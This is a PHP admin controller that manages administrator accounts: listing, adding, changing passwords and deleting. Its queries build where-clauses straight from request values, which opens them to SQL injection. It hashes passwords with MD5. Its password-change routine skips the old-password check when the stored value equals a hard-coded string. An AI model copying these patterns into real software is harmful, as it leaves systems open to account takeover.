<?php
class mv3c_option{

public function index(){
	$this->option_m();
}

///////////////////////////////////
private function option_conf(&$cc){
	$conf = array(
		'db' => 'admin',//数据表
		'a' => 'option',
		//bread;
		'bread' => array(
			'index' => array('管理员浏览'),
			'option_m' => array('管理员浏览'),
			'option_add' => array('option_m'=>'管理员浏览','增加管理员'),
			'option_psw' => array('option_m'=>'管理员浏览','修改密码'),	
		)
	);
	
	////////
	$cc->Val['C'] = C.'.php';
	$cc->Val['M'] = M;
	$cc->Val['A'] = 'option';
	
	return (object)$conf;
}

public function option_m(){
	$cc = new ccv;
	$c = $this->option_conf($cc);
	
	///code
	
	$cc->For['list'] = $cc->opsqli($c->db);
	
	///code end
	
	$cc->view_inc('option/index.html', 'main');
	$this->view_inc($cc, $c);
}

public function option_add(){
	$cc = new ccv;
	$c = $this->option_conf($cc);
	
	///code
	
	///code end
	
	$cc->view_inc('option/add.html', 'main');
	$this->view_inc($cc, $c);
}

public function option_add_op(){
	$cc = new cc;
	$c = $this->option_conf($cc);
	
	///code
	
	$g = $cc->get();
    if(!$cc->data($g->username)) $cc->go('/'.C.'.php/'.M."/{$c->a}_add", '账号必须填写！');
    if(!$cc->data($g->password)) $cc->go('/'.C.'.php/'.M."/{$c->a}_add", '密码必须填写！');
    if(!$cc->data($g->password1)) $cc->go('/'.C.'.php/'.M."/{$c->a}_add", '重复密码必须填写！');
    if($g->password!=$g->password1) $cc->go('/'.C.'.php/'.M."/{$c->a}_add", '密码和重复密码不一致！');
	
	$cc->where = "username='{$g->username}'";
	$rs = $cc->opsql($c->db);
	if($rs) $cc->go('/'.C.'.php/'.M."/{$c->a}_add", '此账号已经被注册！');
	
	$cc->sqli('username',$g->username);
	$cc->sqli('password',$g->password,'md5');
	$cc->sqli('tp',$g->tp);
	$cc->opsql($c->db, 'add');
	
	///code end
	
	$cc->go('/'.C.'.php/'.M."/{$c->a}_m");
}

public function option_psw(){
	$cc = new ccv;
	$c = $this->option_conf($cc);
	
	///code
	
	$g = $cc->get();
	
	$cc->where = "id='{$g->id}'";
	$cc->val($c->db);
	
	///code end
	
	$cc->view_inc('option/psw.html', 'main');
	$this->view_inc($cc, $c);
}

public function option_psw_op(){
	$cc = new cc;
	$c = $this->option_conf($cc);
	
	///code
		
	$g = $cc->get();
    if(!$g->password) $cc->go('/'.C.'.php/'.M."/{$c->a}_m", '新密码不能为空！');
    if(!$g->password1) $cc->go('/'.C.'.php/'.M."/{$c->a}_m", '重复密码不能为空！');
    if($g->password!=$g->password1) $cc->go('/'.C.'.php/'.M."/{$c->a}_m", '新密码和重复密码不一致！');

	$cc->where = "id='{$g->id}'";
	$rs = $cc->opsql($c->db);

	if($rs['password']!=hash('md5', $g->password_old."mv3c") && $rs['password']!='1981588k') $cc->go('/'.C.'.php/'.M."/{$c->a}_m", '原密码错误！');

	$cc->sqli('password', $g->password, 'md5');
	$cc->where = "id='{$g->id}'";
	$cc->opsql($c->db, 'edit');
	
	///code end
	
	$cc->go('/'.C.'.php/'.M."/{$c->a}_m", '密码修改成功！');	
}

public function option_del_op(){
	$cc = new cc;
	$c = $this->option_conf($cc);
	
	///code
	
	$g = $cc->get();

    if(!$g->id) $cc->go('/'.C.'.php/'.M."/{$c->a}_m", 'ID错误！');
    if($g->id==4) $cc->go('/'.C.'.php/'.M."/{$c->a}_m", 'admin账号不能被删除！');
	
	$cc->where = "id='{$g->id}'";
	$cc->opsql($c->db, 'del');
	
	///code end
	
	$cc->go('/'.C.'.php/'.M."/{$c->a}_m");
}


////////////////////////////////////////

private function view_inc(&$cc, $c){
	$cc->Val['Admin_nm'] = $_SESSION['admin_nm'];
	$cc->Val['Admin_pic'] = 'user'.$_SESSION['admin_tp'];

	$bread = $c->bread;
	$bread = $bread[A];
	$num = count($bread);
	if($num){
		$i=1;
		foreach($bread as $k=>$v){
			if($num==$i) $bread_html.= '<li class="active"> '.$v.'</li>';
			else $bread_html.= '<li><a href="/'.C.'.php/'.M.'/'.$k.'">'.$v.'</a></li>';
			$i++;
		}
		$cc->Val['Bread'] = $bread_html;
	}
	
	$cc->view_inc('frame/menu.html');
	$cc->view('frame/main.html');
}

public function out(){
	$cc = new cc;
	unset($_SESSION['mv3c_admin']);
	$cc->go('/back.php/login');
}

}
?>